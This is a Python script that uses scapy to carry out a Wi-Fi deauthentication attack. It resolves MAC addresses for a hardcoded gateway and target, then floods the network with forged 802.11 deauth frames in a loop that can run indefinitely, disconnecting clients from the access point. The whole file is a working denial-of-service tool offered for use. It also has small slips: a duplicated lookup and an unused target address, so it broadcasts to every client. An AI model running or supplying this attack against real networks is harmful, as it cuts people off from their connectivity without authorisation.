"""
    conduct a deauth attack on given target and router
    source: https://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html
"""
import sys

from scapy.config import conf
from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.sendrecv import send

from utils.util import BROADCAST_MAC, get_mac

GATEWAY_IP = "10.2.63.254"
TARGET_IP = "10.2.32.46"
conf.iface = "en0"
conf.verb = 0


def deauth(bssid: str, client: str = BROADCAST_MAC, count: str = -1) -> None:
    """
        Send deauth packets to the access provider to deauthenticate client from the provider

        If client is not "FF:FF:FF:FF:FF:FF", access provider will also receive deauth packets from
        the client
    """
    ap_to_cli_pkt = Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
    cli_to_ap_pkt = None
    if client != BROADCAST_MAC:
        cli_to_ap_pkt = Dot11(
            addr1=bssid,
            addr2=client,
            addr3=bssid
        )/Dot11Deauth()

    print(f"[*] Sending deauth packet to {client} from {bssid}")
    print("Press CTRL+C to quit")

    while count != 0:
        try:
            for _ in range(64):
                send(ap_to_cli_pkt)  # send deauth from AP to client
                if client != BROADCAST_MAC:
                    send(cli_to_ap_pkt)  # send deauth from client to AP
            count -= 1  # infinite loop if count started as -1
        except KeyboardInterrupt:
            break


print("[*] Starting script: deauth.py")
print(f"[*] Gateway IP address: {GATEWAY_IP}")
print(f"[*] Target IP address: {TARGET_IP}")

gateway_mac = get_mac(GATEWAY_IP)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac = get_mac(TARGET_IP)
target_mac = get_mac(TARGET_IP)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting...")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")

deauth(gateway_mac)
